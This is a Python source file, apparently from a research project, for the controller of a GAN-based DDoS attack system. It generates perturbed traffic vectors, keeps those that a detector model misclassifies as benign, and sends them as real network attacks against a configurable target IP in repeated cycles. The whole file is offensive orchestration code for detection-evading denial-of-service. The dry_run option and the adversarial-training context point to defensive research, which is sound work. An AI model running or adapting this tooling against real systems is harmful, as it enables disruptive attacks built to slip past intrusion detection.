"""
Dual-GAM — Controller

Orquestra o ciclo completo de ataque:
  1. Atacante gera vetores perturbados
  2. Defensor avalia (probabilidade de detecção)
  3. Translator converte vetor → AttackParams
  4. Sender executa o ataque real na rede
  5. Resultado retorna como feedback para o próximo ciclo

É o ponto de entrada principal do container h-attack.
"""

from __future__ import annotations

import json
import logging
import time
from pathlib import Path
from typing import Optional

import numpy as np
import torch

from gan.models import Atacante, Defensor
from gan.preprocessing import Preprocessador
from sender.sender import AttackResult, Sender
from translator.translator import AttackParams, Translator

logger = logging.getLogger(__name__)


class AttackController:
    """
    Coordena GAN Atacante → Translator → Sender em loop.

    Em cada ciclo de ataque:
      - Gera N vetores perturbados
      - Filtra os que o Defensor classifica como benigno (evasão bem-sucedida)
      - Traduz os melhores para AttackParams
      - Executa via Sender
      - Loga resultados para análise
    """

    def __init__(
        self,
        target_ip: str,
        target_port: int = 80,
        models_dir: Path = Path("/models"),
        preprocessador_dir: Path = Path("/models/preprocessador"),
        dry_run: bool = False,
        device: str = "cpu",
        ddos_samples_path: Optional[Path] = None,
    ):
        self.target_ip = target_ip
        self.target_port = target_port
        self.models_dir = models_dir
        self.device = torch.device(device)
        self.dry_run = dry_run

        # Carregar componentes
        self.prep = Preprocessador.carregar(preprocessador_dir)
        self.atacante = self._carregar_atacante()
        self.defensor = self._carregar_defensor()

        self.translator = Translator(self.prep, target_ip, target_port)
        self.sender = Sender(dry_run=dry_run)

        self.historico: list[dict] = []
        
        # Amostras reais de DDoS para servir de base às perturbações
        self.X_ddos = self._carregar_amostras_ddos(ddos_samples_path)

    def executar_ciclo(
        self,
        n_vetores: int = 100,
        min_evasao_prob: float = 0.4,  # prob máxima que o defensor dá como DDoS
    ) -> list[AttackResult]:
        """
        Executa um ciclo de ataque completo.

        Args:
            n_vetores: quantos vetores gerar (o atacante tenta N, usa os que evadim)
            min_evasao_prob: threshold — só usa vetores que o defensor classifica
                             com prob < min_evasao_prob de ser DDoS

        Returns:
            Lista de AttackResult para cada ataque executado
        """
        logger.info("=== Ciclo de ataque | target=%s:%d ===", self.target_ip, self.target_port)

        # 1. Gerar vetores perturbados
        vetores, probs = self._gerar_e_avaliar(n_vetores)

        # 2. Filtrar os que evadim
        mask_evasao = probs < min_evasao_prob
        n_evasao = mask_evasao.sum()
        logger.info(
            "Gerados: %d | Evadiram: %d (%.1f%%)",
            n_vetores, n_evasao, 100 * n_evasao / n_vetores,
        )

        if n_evasao == 0:
            logger.warning("Nenhum vetor evadiu o Defensor neste ciclo")
            return []

        vetores_evasao = vetores[mask_evasao]
        probs_evasao = probs[mask_evasao]

        # 3. Traduzir para AttackParams
        params_list = self.translator.traduzir_batch(
            vetores_evasao,
            evasao_probs=probs_evasao.tolist(),
        )

        # 4. Executar ataques
        resultados = []
        for i, params in enumerate(params_list):
            logger.info("Ataque %d/%d: %s", i + 1, len(params_list), params)
            result = self.sender.executar(params)
            resultados.append(result)

            # Log do resultado
            if result.success:
                logger.info(
                    "  ✓ %d pkt | %.2f Mbps | %.1f pps",
                    result.packets_sent, result.mbps_real, result.pps_real,
                )
            else:
                logger.error("  ✗ Erro: %s", result.error)

        self._registrar_ciclo(resultados, n_evasao / n_vetores)
        return resultados

    def executar_loop(
        self,
        n_ciclos: int = 10,
        intervalo_entre_ciclos: float = 5.0,
        **kwargs,
    ) -> None:
        """
        Executa múltiplos ciclos de ataque com pausa entre eles.
        Útil para simulação prolongada do adversarial training.
        """
        for ciclo in range(n_ciclos):
            logger.info("--- Ciclo %d/%d ---", ciclo + 1, n_ciclos)
            self.executar_ciclo(**kwargs)

            if ciclo < n_ciclos - 1:
                logger.info("Aguardando %.1fs antes do próximo ciclo...", intervalo_entre_ciclos)
                time.sleep(intervalo_entre_ciclos)

        self._salvar_historico()

    # ── Internos ───────────────────────────────────────────────────────────

    def _gerar_e_avaliar(self, n: int) -> tuple[np.ndarray, np.ndarray]:
        """
        Gera n vetores perturbados e avalia com o Defensor.
        Retorna (vetores_numpy, probabilidades_numpy).
        """
        self.atacante.eval()
        self.defensor.eval()

        with torch.no_grad():
            # Amostrar n exemplos reais de DDoS para servir de base
            idx = torch.randperm(len(self.X_ddos))[:n]
            X_base = self.X_ddos[idx].to(self.device)

            # Gerar perturbação e aplicar (igual ao trainer)
            amostras_perturbadas = self.atacante.perturba(
                X_base, epsilon=0.3, device=str(self.device)
            )

            probs_t = self.defensor(amostras_perturbadas)

        vetores = amostras_perturbadas.cpu().numpy()
        probs = probs_t.cpu().numpy()

        return vetores, probs
        
    def _escolher_melhor_rodada(self) -> int:
        historico_path = self.models_dir / "historico_treino.json"
        if not historico_path.exists():
            logger.warning("Histórico não encontrado — usando modelos finais")
            return -1

        with open(historico_path) as f:
            historico = json.load(f)

        taxas = historico["taxa_evasao"]
        n = len(taxas)
        metade = n // 2
        taxas_segunda_metade = taxas[metade:]
        melhor_idx = taxas_segunda_metade.index(max(taxas_segunda_metade))
        melhor_rodada = metade + melhor_idx + 1

        logger.info(
            "Melhor rodada (2ª metade): %d | Evasão: %.1f%%",
            melhor_rodada, taxas[melhor_rodada - 1] * 100,
        )
        return melhor_rodada

    def _carregar_atacante(self) -> Atacante:
        rodada = self._escolher_melhor_rodada()
        if rodada == -1:
            path = self.models_dir / "atacante_final.pth"
        else:
            path = self.models_dir / f"atacante_rodada_{rodada:02d}.pth"

        model = Atacante(noise_dim=32, output_dim=77).to(self.device)
        if path.exists():
            model.load_state_dict(torch.load(path, map_location=self.device))
            logger.info("Atacante carregado: %s", path)
        else:
            logger.warning("Checkpoint %s não encontrado — usando pesos aleatórios", path)
        return model

    def _carregar_defensor(self) -> Defensor:
        rodada = self._escolher_melhor_rodada()
        if rodada == -1:
            path = self.models_dir / "defensor_adaptativo_final.pth"
        else:
            rodada_defensor = max(1, rodada - 1)
            path = self.models_dir / f"defensor_rodada_{rodada_defensor:02d}.pth"

        model = Defensor(input_dim=77).to(self.device)
        if path.exists():
            model.load_state_dict(torch.load(path, map_location=self.device))
            logger.info("Defensor carregado: %s (rodada anterior ao atacante)", path)
        else:
            logger.warning("Checkpoint %s não encontrado — usando pesos aleatórios", path)
        return model

    def _carregar_amostras_ddos(self, path: Optional[Path]) -> torch.Tensor:
        """
        Carrega amostras reais de DDoS (já normalizadas) para servir de base
        às perturbações do Atacante. Se não houver arquivo salvo, lança erro.
        """
        default_path = self.models_dir / "ddos_samples.pt"
        path = path or default_path

        if path.exists():
            X_ddos = torch.load(path, map_location=self.device)
            logger.info("Amostras DDoS carregadas de %s (%d amostras)", path, len(X_ddos))
            return X_ddos

        logger.warning(
            "Nenhuma amostra de DDoS salva em %s — "
            "rode o treino com export de amostras ou forneça --ddos-samples",
            path,
        )
        raise FileNotFoundError(
            f"Amostras de DDoS não encontradas em {path}. "
            "É necessário rodar o treino com exportação de amostras."
        )

    def _registrar_ciclo(self, resultados: list[AttackResult], taxa_evasao: float) -> None:
        entry = {
            "timestamp": time.time(),
            "taxa_evasao": taxa_evasao,
            "n_ataques": len(resultados),
            "packets_sent_total": sum(r.packets_sent for r in resultados),
            "bytes_sent_total": sum(r.bytes_sent for r in resultados),
            "success_rate": sum(r.success for r in resultados) / max(len(resultados), 1),
        }
        self.historico.append(entry)

    def _salvar_historico(self) -> None:
        path = self.models_dir / "historico_ataques.json"
        with open(path, "w") as f:
            json.dump(self.historico, f, indent=2)
        logger.info("Histórico salvo em %s", path)
